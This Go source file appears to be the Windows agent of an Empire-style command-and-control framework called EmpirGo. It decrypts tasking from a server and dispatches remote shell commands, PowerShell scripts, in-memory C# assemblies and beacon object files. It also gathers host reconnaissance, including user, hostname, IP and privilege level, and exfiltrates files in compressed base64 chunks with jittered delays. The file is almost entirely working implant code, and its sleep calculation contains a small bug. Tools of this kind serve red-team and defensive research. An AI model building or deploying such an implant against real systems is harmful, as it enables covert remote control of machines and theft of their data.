package agent

import (
	"EmpirGo/common"
	"EmpirGo/tasks"
	"encoding/base64"
	"encoding/json"
	"fmt"
	w32 "github.com/gonutz/w32/v2"
	"golang.org/x/sys/windows"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

func (ma *MainAgent) powershellTask(data []byte) string {
	script := string(data)
	result := tasks.RunPowerShellScript(script)
	return result
}

func (ma *MainAgent) csharpTask(data []byte) string {
	dataStr := string(data)
	parts := strings.Split(dataStr, ",")
	params, _ := common.DecodeAndExtract(parts[1])
	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])

	result := tasks.Runcsharptask(dataBytes, params)
	return result
}

// csharpTaskBackground runs the C# task in the background and sends the result when done
func (ma *MainAgent) csharpTaskBackground(data []byte, resultID int) {
	dataStr := string(data)
	parts := strings.Split(dataStr, ",")
	params, _ := common.DecodeAndExtract(parts[1])
	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])

	routingPacket := ma.PacketHandler.BuildResponsePacket(122, "Task Started", resultID)
	ma.preparepacket(routingPacket)

	tasks.RunCsharpTaskInBackground(dataBytes, params, func(result string) {
		routingPacket := ma.PacketHandler.BuildResponsePacket(122, result, resultID)
		ma.preparepacket(routingPacket)
	})
}

func (ma *MainAgent) processTasking(encData []byte) (packetType uint16, data []byte, resultID int) {
	tasking, err := common.AesDecryptAndVerify(ma.PacketHandler.Aeskey, encData)
	if err != nil {
		return
	}

	offset := 0
	var resultPackets string

	for {
		packetType, _, _, resultID, length, data, remainingData, err := ma.PacketHandler.ParseTaskPacket(tasking, offset)
		if err != nil {
			return 0, nil, 0
		}

		result := ma.ProcessPacket(packetType, data, int(resultID))
		if result != "" {
			resultPackets += result
		}

		offset += 12 + int(length)
		if len(remainingData) == 0 {
			break
		}
	}
	return 0, nil, 0
}

func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int) string {
	switch packetType {
	case 1:
		result := getSysinfo(ma.PacketHandler.Server, "00000000")
		routingPacket := ma.PacketHandler.BuildResponsePacket(1, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	case 2:
		os.Exit(0)
		return "unimplemented"
	case 34:
		return "unimplemented"
	case 40:
		command := string(data)
		result := common.RunCommand(command)
		routingPacket := ma.PacketHandler.BuildResponsePacket(40, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	case 41:
		filePath := string(data)
		ma.FileDownloadHandler(filePath, resultID)
		return ""
	case 42:
		var err error
		result, err := tasks.FileUpload(string(data))
		if err != nil {
			result = fmt.Sprintf("[!] Error in file upload: %s", err)
			routingPacket := ma.PacketHandler.BuildResponsePacket(0, result, resultID)
			ma.preparepacket(routingPacket)
			return "error"
		} else {
			routingPacket := ma.PacketHandler.BuildResponsePacket(42, result, resultID)
			ma.preparepacket(routingPacket)
			return "completed"
		}
	case 43:
		result := ma.DirectoryListHandler(string(data), resultID)
		routingPacket := ma.PacketHandler.BuildResponsePacket(43, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	case 50:
		return "unimplemented"
	case 51:
		return "unimplemented"
	case 60:
		return "unimplemented"
	case 70:
		return "unimplemented"
	case 100, 101, 102:
		result := ma.powershellTask(data)
		routingPacket := ma.PacketHandler.BuildResponsePacket(112, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	case 120:
		result := ma.csharpTask(data)
		routingPacket := ma.PacketHandler.BuildResponsePacket(120, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	case 122:
		ma.csharpTaskBackground(data, resultID)
		return ""
	case 130:
		result := tasks.Execute_bof(data)
		routingPacket := ma.PacketHandler.BuildResponsePacket(130, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	default:
		result := fmt.Sprintf("invalid tasking ID: %d", packetType)
		routingPacket := ma.PacketHandler.BuildResponsePacket(0, result, resultID)
		ma.preparepacket(routingPacket)
		return ""
	}
}

func getSysinfo(server string, nonce string) string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	processID := os.Getpid()
	language := "go"
	processName := filepath.Base(os.Args[0])
	operatingsystem := runtime.GOOS
	v := w32.RtlGetVersion()
	osDetails := fmt.Sprintf("%s %d Build:%d", operatingsystem, v.MajorVersion, v.BuildNumber)
	highIntegrity := fmt.Sprintf("%t", isHighIntegrity())
	internalIP := getIP()
	architecture := runtime.GOARCH
	version := "1.23"

	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
		language, version, architecture)
}

const (
	SECURITY_MANDATORY_HIGH_RID = 0x00003000
)

type TokenMandatoryLabel struct {
	Label windows.SIDAndAttributes
}

func isHighIntegrity() bool {
	pid := uint32(os.Getpid())
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		fmt.Printf("Failed to open process: %v\n", err)
		return false
	}
	defer windows.CloseHandle(handle)

	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_QUERY, &token)
	if err != nil {
		fmt.Printf("Failed to open process token: %v\n", err)
		return false
	}
	defer token.Close()

	var tokenInfoLength uint32
	err = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, nil, 0, &tokenInfoLength)
	if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
		fmt.Printf("Error querying token information length: %v\n", err)
		return false
	}

	tokenInfo := make([]byte, tokenInfoLength)
	err = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &tokenInfo[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		fmt.Printf("Error querying token information: %v\n", err)
		return false
	}

	tokenIL := (*TokenMandatoryLabel)(unsafe.Pointer(&tokenInfo[0])) // Use your defined struct
	if tokenIL.Label.Sid == nil {
		fmt.Println("Error: tokenIL.Label.Sid is nil")
		return false
	}

	rid, err := getIntegrityLevelRID(tokenIL.Label.Sid)
	if err != nil {
		fmt.Printf("Error retrieving RID: %v\n", err)
		return false
	}

	return rid >= SECURITY_MANDATORY_HIGH_RID
}

func getIntegrityLevelRID(sid *windows.SID) (uint32, error) {
	if sid == nil {
		return 0, fmt.Errorf("SID is nil")
	}

	subAuthorityCount := sid.SubAuthorityCount()
	if subAuthorityCount == 0 {
		return 0, fmt.Errorf("SID has no sub-authorities")
	}

	rid := sid.SubAuthority(uint32(subAuthorityCount - 1))
	return rid, nil
}

func getIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ip := ipNet.IP.String()
				if !strings.HasPrefix(ip, "169.254") {
					return ip
				}
			}
		}
	}
	return ""
}

func (ma *MainAgent) FileDownloadHandler(data string, resultID int) {
	fileList, err := tasks.GetFileList(data)
	if err != nil || len(fileList) == 0 {
		ma.SendFileNotFoundResponse(resultID)
		return
	}

	for _, filePath := range fileList {
		offset := 0
		size := tasks.GetFileSize(filePath)
		partIndex := 0

		for {
			filePart, err := tasks.GetFilePart(filePath, offset, 512000)
			if err != nil || len(filePart) == 0 {
				break
			}

			compData, err := tasks.CompressData(filePart)
			if err != nil {
				break
			}

			encodedData := base64.StdEncoding.EncodeToString(compData)
			partData := fmt.Sprintf("%d|%s|%d|%s", partIndex, filePath, size, encodedData)
			routingPacket := ma.PacketHandler.BuildResponsePacket(41, partData, resultID)

			ma.preparepacket(routingPacket)

			sleepTime := ma.getRandomSleepTime()
			time.Sleep(sleepTime)
			partIndex++
			offset += 512000
		}
	}
}

func (ma *MainAgent) SendFileNotFoundResponse(resultID int) {
	routingPacket := ma.PacketHandler.BuildResponsePacket(40, "file does not exist or cannot be accessed", resultID)
	ma.preparepacket(routingPacket)
}

func (ma *MainAgent) getRandomSleepTime() time.Duration {
	minSleep := int((1.0 - ma.jitter) * float64(ma.jitter))
	maxSleep := int((1.0 + ma.jitter) * float64(ma.delay))
	sleepTime := rand.Intn(maxSleep-minSleep) + minSleep
	return time.Duration(sleepTime) * time.Millisecond
}

func (ma *MainAgent) DirectoryListHandler(data string, resultID int) string {
	result, err := tasks.DirectoryList(data)
	if err != nil {
		return fmt.Sprintf("Directory %s not found.", data)
	}

	resultData, err := json.Marshal(result)
	if err != nil {
		return "Error processing directory data"
	}
	return string(resultData)
}
